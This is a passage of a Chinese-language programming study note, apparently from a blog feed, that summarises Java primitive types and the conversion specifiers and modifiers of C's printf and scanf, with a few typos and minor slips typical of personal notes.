<li>单精度、32位、符合IEEE 754标准的浮点数</li>
<li>float 在储存大型浮点数组的时候可节省内存空间</li>
<li>浮点数不能用来表示精确的值，如货币</li>
</ul>
<p><strong>double</strong></p>
<ul>
<li>双精度、64位、符合IEEE 754标准的浮点数</li>
<li>浮点数的默认类型为double类型</li>
<li>double类型同样不能表示精确的值，如货币</li>
</ul>
<p><strong>char</strong></p>
<ul>
<li>char类型是一个单一的 16 位 Unicode 字符</li>
<li>最小值是 0</li>
<li>最大值是 65535</li>
<li>char 数据类型可以储存任何字符</li>
</ul>
<p><strong>boolean</strong></p>
<ul>
<li>boolean数据类型表示一位的信息</li>
<li>只有两个取值：true 和 false</li>
<li>这种类型只作为一种标志来记录 true/false 情况</li>
</ul>
<p><strong>prinft和scanf很像，但是修饰符有不一样的地方，所以试着整理</strong></p>
<p>printf()相关 </p>
<p>转化说明</p>
<ul>
<li><p>%a    浮点数、十六进制数和p计数法</p>
</li>
<li><p>%c    单个字符</p>
</li>
<li><p>%d    有符号十进制整数</p>
</li>
<li><p>%e    浮点数、e计数法（小数点左侧一个数字，右侧六个小数）</p>
</li>
<li><p>%f    浮点数，十进制计数法（默认6位小数）</p>
</li>
<li><p>%g    根据值的不同自动选择%f或%e。%e用于指数小于-4或者大于等于精度时。</p>
</li>
<li><p>%i    有符号十进制整数（与%d相同）</p>
</li>
<li><p>%o    无符号八进制整数</p>
</li>
<li><p>%p    指针</p>
</li>
<li><p>%s    字符串</p>
</li>
<li><p>%u    无符号十进制整数</p>
</li>
<li><p>%x    无符号十六进制整数，使用十六进制数0f</p>
</li>
<li><p>%%    打印一个%</p>
</li>
</ul>
<p>修饰符</p>
<ul>
<li>​    -减号       会把项目打印在字段的左侧开始处。例如：“-20s”</li>
<li>​    +加号      使值带正负号</li>
<li>​    空格         正为前导空格，负为-</li>
<li>​    #井号      使用转换说明的对应可选形式</li>
<li>​     0             使用前导0占据字符宽度空格</li>
<li>​     数字           字段宽度最小值</li>
<li>​     h             和整数转换说明一起使用 表short int</li>
<li>​     hh            同上，但是表short char</li>
<li>​     l                表long int </li>
<li>​     ll              表longl long int</li>
</ul>
<hr>
<p>scanf()相关 </p>
<p>转化说明</p>
<ul>
<li>%c 把输入视为字符</li>
<li>%d 把输入视为10进制整数</li>
<li>%e %f %g 把输入视为浮点数</li>
<li>%i 把输入视为带符号的10进制整数</li>
<li>%o 把输入视为带符号的8进制整数</li>
<li>%x 把输入视为带符号的16进制整数</li>
<li>%u 把输入视为无符号10进制整数</li>
<li>%p 把输入视为指针</li>
</ul>
<p>修饰符</p>
<p>​    *                跳过赋值</p>
<p>数字              读取的最大宽度 如%10d 读到第10位或是空白时停止</p>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
</search>
